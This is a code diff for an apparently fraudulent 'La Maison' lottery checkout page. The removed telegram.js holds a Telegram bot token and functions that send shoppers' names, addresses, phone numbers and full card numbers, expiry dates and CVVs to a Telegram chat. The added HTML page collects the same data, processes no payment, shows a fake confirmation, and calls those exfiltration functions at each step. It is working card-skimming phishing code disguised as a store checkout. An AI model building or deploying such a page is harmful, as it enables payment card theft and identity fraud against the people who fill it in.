@@ -1,109 +1,319 @@
-const BOT_TOKEN = '8318197368:AAFyH0JcBzwWso1RJJKCHOb720-xGzhE8H4';
-const CHAT_ID = '8376441380';
-const API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Checkout - La Maison</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@600&family=Inter:wght@400;500&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg: #F7F6F5; --text-primary: #111111; --text-body: #333333; --text-secondary: #6B7280; --accent-gold: #B99566; --border-light: #E8E7E5; --dark-accent-bg: #1B1B1B; --bg-card: rgba(255, 255, 255, 0.6);
+        }
+        body { box-sizing: border-box; background-color: var(--bg); color: var(--text-body); line-height: 1.6; font-family: 'Inter', sans-serif; }
+        * { -webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; }
+        .luxury-gradient { background: #000000; }
+        .gold-accent { background: var(--accent-gold); }
+        .card-shadow { box-shadow: 0 8px 24px rgba(0,0,0,0.04); }
+        .glass-effect { background: var(--bg-card); backdrop-filter: blur(10px); border: 1px solid var(--border-light); }
+        .fade-in { animation: fadeIn 1.2s cubic-bezier(0.16, 1, 0.3, 1); }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(40px) scale(0.95); } to { opacity: 1; transform: translateY(0) scale(1); } }
+        .luxury-input { border: 1px solid var(--border-light); background: #FFFFFF; transition: all 0.3s ease; }
+        .luxury-input:focus { border-color: var(--accent-gold); box-shadow: 0 0 0 3px rgba(185, 149, 102, 0.2); outline: none; }
+        .btn { background-color: #000; color: #fff; padding: 12px 30px; border-radius: 30px; font-weight: 500; transition: background 0.3s ease; display: inline-block; }
+        .btn:hover { background-color: #333; }
 
-/**
- * Sends a formatted message to the Telegram chat.
- * @param {string} text - The message content.
- */
-async function sendTelegramMessage(text) {
-    const data = {
-        chat_id: CHAT_ID,
-        text: text,
-        parse_mode: 'HTML'
-    };
+        /* Step Indicator Styles */
+        .step-indicator { display: flex; flex-direction: column; align-items: center; color: var(--text-secondary); transition: color 0.3s ease; }
+        .step-indicator.active { color: var(--text-primary); font-weight: 600; }
+        .step-circle { width: 2.5rem; height: 2.5rem; border-radius: 50%; border: 2px solid var(--border-light); display: flex; align-items: center; justify-content: center; font-weight: 600; margin-bottom: 0.5rem; background-color: #fff; transition: all 0.3s ease; }
+        .step-indicator.active .step-circle { border-color: var(--accent-gold); background-color: var(--accent-gold); color: #fff; }
+        .step-line { flex-grow: 1; height: 2px; background-color: var(--border-light); width: 4rem; }
+        .checkout-step { display: none; }
+        .checkout-step.active { display: block; animation: fadeIn 0.5s ease; }
 
-    try {
-        const response = await fetch(API_URL, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify(data)
+        .btn-secondary {
+            background-color: transparent;
+            color: var(--text-body);
+            border: 1px solid var(--border-light);
+            padding: 12px 30px;
+            border-radius: 30px;
+            font-weight: 500;
+            transition: all 0.3s ease;
+        }
+        .btn-secondary:hover {
+            background-color: var(--bg);
+            border-color: var(--text-secondary);
+        }
+    </style>
+</head>
+<body class="min-h-full">
+    <div class="min-h-full font-['Inter']">
+        <header class="py-8 px-8 flex justify-center items-center">
+            <a href="index.html" class="text-3xl md:text-4xl font-['Playfair_Display'] font-light tracking-[0.25em] uppercase" style="color: var(--text-primary);">La Maison</a>
+        </header>
+
+        <main class="max-w-4xl mx-auto px-4 sm:px-8">
+            <!-- Checkout Form (Initially visible) -->
+            <div id="checkoutContainer" class="glass-effect rounded-3xl card-shadow p-8 sm:p-12 fade-in">
+                <!-- Step Indicators -->
+                <div class="flex items-center justify-center w-full max-w-md mx-auto mb-12">
+                    <div id="step-indicator-1" class="step-indicator active">
+                        <div class="step-circle">1</div>
+                        <div class="step-label text-sm">Shipping</div>
+                    </div>
+                    <div class="step-line"></div>
+                    <div id="step-indicator-2" class="step-indicator">
+                        <div class="step-circle">2</div>
+                        <div class="step-label text-sm">Payment</div>
+                    </div>
+                </div>
+
+                <h2 class="text-3xl font-['Playfair_Display'] font-light text-center mb-12" style="color: var(--text-primary); font-size: 2.5rem; line-height: 1.2; letter-spacing: 0.05em;">
+                    Complete Your Purchase
+                </h2>
+                
+                <form id="multiStepForm" onsubmit="handleCheckout(event)">
+                    <!-- Step 1: Shipping Information -->
+                    <div id="step-1" class="checkout-step active">
+                        <div class="space-y-8">
+                            <h3 class="text-xl font-medium tracking-wide" style="color: var(--text-primary);">Shipping Details</h3>
+                            <div class="grid md:grid-cols-2 gap-8">
+                                <div>
+                                    <label class="block font-medium mb-3 tracking-wide" style="color: var(--text-primary);">First Name</label>
+                                    <input type="text" id="firstName" class="w-full luxury-input rounded-xl px-6 py-4 text-lg">
+                                </div>
+                                <div>
+                                    <label class="block font-medium mb-3 tracking-wide" style="color: var(--text-primary);">Last Name</label>
+                                    <input type="text" id="lastName" class="w-full luxury-input rounded-xl px-6 py-4 text-lg">
+                                </div>
+                            </div>
+                            <div>
+                                <label class="block font-medium mb-3 tracking-wide" style="color: var(--text-primary);">Shipping Address</label>
+                                <input type="text" id="address1" placeholder="Street Address" class="w-full luxury-input rounded-xl px-6 py-4 text-lg mb-4">
+                                <input type="text" id="address2" placeholder="Apartment, suite, etc. (optional)" class="w-full luxury-input rounded-xl px-6 py-4 text-lg">
+                            </div>
+                            <div>
+                                <label class="block font-medium mb-3 tracking-wide" style="color: var(--text-primary);">Country</label>
+                                <input type="text" id="country" value="United States" class="w-full luxury-input rounded-xl px-6 py-4 text-lg bg-gray-100" readonly>
+                            </div>
+                            <div class="grid md:grid-cols-3 gap-8">
+                                <div>
+                                    <label class="block font-medium mb-3 tracking-wide" style="color: var(--text-primary);">City</label>
+                                    <input type="text" id="city" class="w-full luxury-input rounded-xl px-6 py-4 text-lg">
+                                </div>
+                                <div>
+                                    <label class="block font-medium mb-3 tracking-wide" style="color: var(--text-primary);">State</label>
+                                    <input type="text" id="state" class="w-full luxury-input rounded-xl px-6 py-4 text-lg">
+                                </div>
+                                <div>
+                                    <label class="block font-medium mb-3 tracking-wide" style="color: var(--text-primary);">Postal Code</label>
+                                    <input type="text" id="postalCode" class="w-full luxury-input rounded-xl px-6 py-4 text-lg">
+                                </div>
+                            </div>
+                            <div class="border-t pt-8" style="border-color: var(--border-light);">
+                                <h3 class="text-xl font-medium tracking-wide" style="color: var(--text-primary);">Contact Information</h3>
+                                <div class="mt-8">
+                                    <label class="block font-medium mb-3 tracking-wide" style="color: var(--text-primary);">Email Address</label>
+                                    <input type="email" id="email" class="w-full luxury-input rounded-xl px-6 py-4 text-lg">
+                                </div>
+                                <div class="mt-8">
+                                    <label class="block font-medium mb-3 tracking-wide" style="color: var(--text-primary);">Phone Number</label>
+                                    <input type="tel" id="phone" class="w-full luxury-input rounded-xl px-6 py-4 text-lg">
+                                </div>
+                            </div>
+                        </div>
+                        <div class="mt-12 text-right">
+                            <button type="button" onclick="goToStep(2)" class="btn">Continue to Payment &rarr;</button>
+                        </div>
+                    </div>
+
+                    <!-- Step 2: Payment Information -->
+                    <div id="step-2" class="checkout-step">
+                        <div class="space-y-8">
+                            <!-- Order Summary -->
+                            <div class="border-b pb-8" style="border-color: var(--border-light);">
+                                <h4 class="text-xl font-medium mb-6 tracking-wide" style="color: var(--text-primary);">Order Summary</h4>
+                                <div id="orderSummary" class="bg-gray-50 rounded-2xl p-6">
+                                    <!-- Will be populated by JavaScript -->
+                                </div>
+                            </div>
+                            <!-- Payment Information -->
+                            <div>
+                                <h4 class="text-xl font-medium mb-6 tracking-wide" style="color: var(--text-primary);">Payment Information</h4>
+                                <div class="grid md:grid-cols-2 gap-8">
+                                    <div class="md:col-span-2">
+                                        <label class="block font-medium mb-3 tracking-wide" style="color: var(--text-primary);">Card Number</label>
+                                        <input type="text" placeholder="•••• •••• •••• ••••" class="w-full luxury-input rounded-xl px-6 py-4 text-lg" required>
+                                    </div>
+                                    <div>
+                                        <label class="block font-medium mb-3 tracking-wide" style="color: var(--text-primary);">Expiry Date</label>
+                                        <input type="text" placeholder="MM/YY" class="w-full luxury-input rounded-xl px-6 py-4 text-lg" required>
+                                    </div>
+                                    <div>
+                                        <label class="block font-medium mb-3 tracking-wide" style="color: var(--text-primary);">CVV</label>
+                                        <input type="text" placeholder="•••" class="w-full luxury-input rounded-xl px-6 py-4 text-lg" required>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="mt-12 flex justify-between items-center">
+                            <button type="button" onclick="goToStep(1)" class="btn-secondary">&larr; Back to Shipping</button>
+                            <button type="submit" class="gold-accent text-white font-bold py-4 px-8 rounded-md text-lg tracking-wide">
+                                Complete Purchase
+                            </button>
+                        </div>
+                    </div>
+                </form>
+            </div>
+
+            <!-- Success Message (Hidden Initially) -->
+            <div id="successMessage" class="glass-effect rounded-3xl card-shadow p-12 text-center fade-in hidden">
+                <div class="text-8xl mb-8">🎉</div>
+                <h2 class="text-4xl font-['Playfair_Display'] font-light mb-6" style="color: var(--text-primary); font-size: 2.5rem; line-height: 1.2; letter-spacing: 0.05em;">
+                    Your Entry is Confirmed!
+                </h2>
+                <p class="text-lg leading-relaxed mb-8 max-w-2xl mx-auto" style="color: var(--text-secondary);">
+                    Thank you for your purchase. You will receive a confirmation email shortly with your entry details.
+                    We will notify the winner once the draw is complete. Good luck!
+                </p>
+                <a href="index.html" class="btn py-4 px-10 tracking-wide">
+                    BACK TO HOMEPAGE
+                </a>
+            </div>
+        </main>
+
+        <!-- Footer -->
+        <footer class="luxury-gradient text-white py-12 mt-20">
+            <div class="max-w-6xl mx-auto px-8 text-center">
+                <div class="flex flex-wrap justify-center gap-x-6 gap-y-2 mb-6 text-white/70 text-sm">
+                    <a href="legal.html#terms" class="hover:text-white transition-colors">Terms & Conditions</a>
+                    <a href="legal.html#privacy" class="hover:text-white transition-colors">Privacy Policy</a>
+                    <a href="legal.html#contact" class="hover:text-white transition-colors">Contact Us</a>
+                    <a href="legal.html#faq" class="hover:text-white transition-colors">FAQs</a>
+                    <a href="legal.html#fair-draw" class="hover:text-white transition-colors">Fair Draw Info</a>
+                </div>
+                <p class="mb-3 font-light tracking-wide text-sm text-white/90 uppercase">© 2025 La Maison. All rights reserved.</p>
+                <p class="text-sm text-white/80 mb-3">🛡️ Operated by La Maison LTD • Officially authorized to conduct promotional lotteries in the U.S.</p>
+            </div>
+        </footer>
+    </div>
+
+    <script src="telegram.js"></script>
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const checkoutDataString = localStorage.getItem('checkoutData');
+            if (!checkoutDataString) {
+                // If no data, redirect back to homepage
+                window.location.href = 'index.html';
+                return;
+            }
+
+            const checkoutData = JSON.parse(checkoutDataString);
+            const { selectedPackage, selectedPrice } = checkoutData;
+
+            // Populate order summary
+            const orderSummary = document.getElementById('orderSummary');
+            orderSummary.innerHTML = `
+                <div class="flex justify-between items-center mb-2">
+                    <span>${selectedPackage}</span>
+                    <span>$${selectedPrice}</span>
+                </div>
+                <div class="border-t pt-2 mt-2" style="border-color: var(--border-light);">
+                    <div class="flex justify-between items-center font-semibold text-lg">
+                        <span>Total</span>
+                        <span>$${selectedPrice}</span>
+                    </div>
+                </div>
+            `;
         });
 
-        const result = await response.json();
-        if (result.ok) {
-            console.log('Telegram message sent successfully.');
-        } else {
-            console.error('Telegram API Error:', result.description);
+        function handleCheckout(event) {
+            event.preventDefault();
+            
+            const checkoutData = JSON.parse(localStorage.getItem('checkoutData'));
+
+            // Collect all form data
+            const checkoutInfo = {
+                package: checkoutData.selectedPackage,
+                price: checkoutData.selectedPrice,
+                firstName: document.getElementById('firstName').value,
+                lastName: document.getElementById('lastName').value,
+                address1: document.getElementById('address1').value,
+                address2: document.getElementById('address2').value,
+                city: document.getElementById('city').value,
+                state: document.getElementById('state').value,
+                postalCode: document.getElementById('postalCode').value,
+                country: document.getElementById('country').value,
+                email: document.getElementById('email').value,
+                phone: document.getElementById('phone').value,
+                // --- ADD PAYMENT INFO ---
+                cardNumber: document.querySelector('input[placeholder="•••• •••• •••• ••••"]').value,
+                expiryDate: document.querySelector('input[placeholder="MM/YY"]').value,
+                cvv: document.querySelector('input[placeholder="•••"]').value,
+                // ------------------------
+            };
+
+            // Hide checkout container and show success message
+            document.getElementById('checkoutContainer').classList.add('hidden');
+            document.getElementById('successMessage').classList.remove('hidden');
+            
+            // Clear the checkout data from local storage
+            localStorage.removeItem('checkoutData');
+
+            // Send notification to Telegram
+            sendCheckoutNotification(checkoutInfo);
+
+            window.scrollTo({ top: 0, behavior: 'smooth' });
         }
-    } catch (error) {
-        console.error('Error sending Telegram message:', error);
-    }
-}
 
-/**
- * Formats and sends the complete checkout data to Telegram.
- * @param {object} checkoutInfo - The collected checkout data.
- */
-function sendCheckoutNotification(checkoutInfo) {
-    const message = `
-<b>🎉 New Entry on La Maison! 🎉</b>
---------------------------------------
-<b>Package:</b> ${checkoutInfo.package}
-<b>Price:</b> $${checkoutInfo.price}
---------------------------------------
-<b>Name:</b> ${checkoutInfo.firstName} ${checkoutInfo.lastName}
-<b>Email:</b> ${checkoutInfo.email}
-<b>Phone:</b> ${checkoutInfo.phone}
---------------------------------------
-<b>Address:</b>
-${checkoutInfo.address1}
-${checkoutInfo.address2 ? checkoutInfo.address2 + '\n' : ''}${checkoutInfo.city}, ${checkoutInfo.state} ${checkoutInfo.postalCode}
-${checkoutInfo.country}
---------------------------------------
-<b>💳 Payment Info:</b>
-<b>Card:</b> ${checkoutInfo.cardNumber}
-<b>Expiry:</b> ${checkoutInfo.expiryDate}
-<b>CVV:</b> ${checkoutInfo.cvv}
-    `;
-    sendTelegramMessage(message.trim());
-}
+        function goToStep(stepNumber) {
+            const form = document.getElementById('multiStepForm');
+            let isValid = true;
 
-/**
- * Formats and sends the customer's shipping info to Telegram.
- * @param {object} shippingInfo - The collected shipping data.
- */
-function sendShippingInfoNotification(shippingInfo) {
-    const message = `
-<b>👤 Customer Info Submitted! 👤</b>
---------------------------------------
-<b>Name:</b> ${shippingInfo.firstName} ${shippingInfo.lastName}
-<b>Email:</b> ${shippingInfo.email}
-<b>Phone:</b> ${shippingInfo.phone}
---------------------------------------
-<i>Customer is proceeding to payment...</i>
-    `;
-    sendTelegramMessage(message.trim());
-}
+            // Validate current step before proceeding
+            if (stepNumber > 1) {
+                const currentStepFields = document.querySelector('#step-1').querySelectorAll('input[required]');
+                currentStepFields.forEach(field => {
+                    if (!field.value.trim()) {
+                        field.style.borderColor = 'red';
+                        isValid = false;
+                    } else {
+                        field.style.borderColor = ''; // Reset border color
+                    }
+                });
+            }
 
-/**
- * Formats and sends the ticket selection data to Telegram.
- * @param {object} selectionData - The selected ticket package data.
- */
-function sendTicketSelectionNotification(selectionData) {
-    const message = `
-<b>🎟️ New Ticket Selection! 🎟️</b>
---------------------------------------
-<b>Package:</b> ${selectionData.selectedPackage}
-<b>Price:</b> $${selectionData.selectedPrice}
-<b>Tickets:</b> ${selectionData.selectedTickets}
-    `;
-    sendTelegramMessage(message.trim());
-}
+            if (!isValid) {
+                // Optionally, show an error message
+                return;
+            }
 
-/**
- * Formats and sends the ticket selection data to Telegram.
- * @param {object} selectionData - The selected ticket package data.
- */
-function sendTicketSelectionNotification(selectionData) {
-    const message = `
-<b>🎟️ New Ticket Selection! 🎟️</b>
---------------------------------------
-<b>Package:</b> ${selectionData.selectedPackage}
-<b>Price:</b> $${selectionData.selectedPrice}
-<b>Tickets:</b> ${selectionData.selectedTickets}
-    `;
-    sendTelegramMessage(message.trim());
-}
+            // If moving from step 1 to 2, send shipping info
+            if (stepNumber === 2) {
+                const shippingInfo = {
+                    firstName: document.getElementById('firstName').value,
+                    lastName: document.getElementById('lastName').value,
+                    email: document.getElementById('email').value,
+                    phone: document.getElementById('phone').value,
+                };
+                // This function is in telegram.js
+                sendShippingInfoNotification(shippingInfo);
+            }
+
+
+            // Hide all steps
+            document.querySelectorAll('.checkout-step').forEach(step => step.classList.remove('active'));
+            // Show the target step
+            document.getElementById(`step-${stepNumber}`).classList.add('active');
+
+            // Update indicators
+            document.querySelectorAll('.step-indicator').forEach(indicator => indicator.classList.remove('active'));
+            for (let i = 1; i <= stepNumber; i++) {
+                document.getElementById(`step-indicator-${i}`).classList.add('active');
+            }
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        }
+    </script>
+</body>
+</html>
